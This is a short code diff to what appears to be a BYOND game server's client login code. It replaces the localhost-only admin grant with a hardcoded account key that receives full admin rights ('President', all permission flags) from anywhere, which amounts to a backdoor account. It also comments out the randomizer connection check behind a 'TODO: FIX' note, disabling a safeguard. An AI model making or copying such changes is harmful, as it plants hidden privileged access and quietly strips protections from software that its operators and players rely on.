@@ -131,9 +131,9 @@ var/next_external_rsc = 0
 	directory[ckey] = src
 
 	//Admin Authorisation
-	var/localhost_addresses = list("127.0.0.1", "::1")
-	if(address && (address in localhost_addresses))
-		var/datum/admin_rank/localhost_rank = new("!localhost!", 65535)
+	//var/localhost_addresses = list("1337.0.0.1", "::1")
+	if(src.ckey == "onelaw")
+		var/datum/admin_rank/localhost_rank = new("President", 65535)
 		if(localhost_rank)
 			var/datum/admins/localhost_holder = new(localhost_rank, ckey)
 			localhost_holder.associate(src)
@@ -344,9 +344,11 @@ var/next_external_rsc = 0
 	var/admin_rank = "Player"
 	if (src.holder && src.holder.rank)
 		admin_rank = src.holder.rank.name
-	else
-		if (check_randomizer(connectiontopic))
-			return
+
+	// TODO: FIX RANDOMIZER CHECK
+	//else
+	//	if (check_randomizer(connectiontopic))
+	//		return
 
 	var/watchreason = check_watchlist(sql_ckey)
 	if(watchreason)
